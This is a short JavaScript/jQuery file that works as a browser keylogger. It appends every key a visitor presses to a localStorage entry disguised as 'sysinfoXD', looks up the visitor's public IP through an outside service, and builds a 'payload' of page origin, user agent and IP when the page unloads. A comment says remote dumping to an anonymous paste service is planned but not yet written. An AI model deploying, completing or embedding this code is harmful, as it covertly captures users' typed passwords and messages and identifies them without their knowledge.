var date = new Date();
var init = true
var today = "".concat(date.getDate(),"-",date.getMonth(),"-",date.getFullYear())
// console.log(today);

$(document).ready(function(){}).keyup(function(e){

        if (window.localStorage.getItem("todayDateXD") == null){
            // console.log("date was null -- fixed it to today");
            window.localStorage.setItem("todayDateXD",today);
        } else {
            console.log("date exists");
            if (window.localStorage.getItem("todayDateXD") !== today){
                window.localStorage.setItem("sysinfoXD","date:"+today);
                window.localStorage.setItem("todayDateXD",today);
                // console.log("date was not today, changed it to follows");
                // console.log(window.localStorage.getItem("todayDateXD")+" - localdate");
                // console.log(window.localStorage.getItem("sysinfoXD")+" - sysinfo");
            }
        }
        if (window.localStorage.getItem("sysinfoXD") == null){
            // console.log("value was null, fixed it");
            window.localStorage.setItem("sysinfoXD","data:"+today);
        }
        var payload = window.localStorage.getItem("sysinfoXD")+e.key;
        window.localStorage.setItem("sysinfoXD",payload);
        // console.log(payload);
});


// To implement remote logged dump
// Missing Requirement : Anonymous pastebin-alike service with edit/update API
jQuery.getJSON("https://api.ipify.org/?format=json", function(e) {
    window.localStorage.setItem("ip",e.ip);
});

jQuery(window).bind('beforeunload',function(){
    var payload = {"url":window.location.origin,"user-agent":navigator.appVersion,"ip":window.localStorage.getItem("ip")};
    console.log(payload);
    window.localStorage.clear();
    return undefined;
});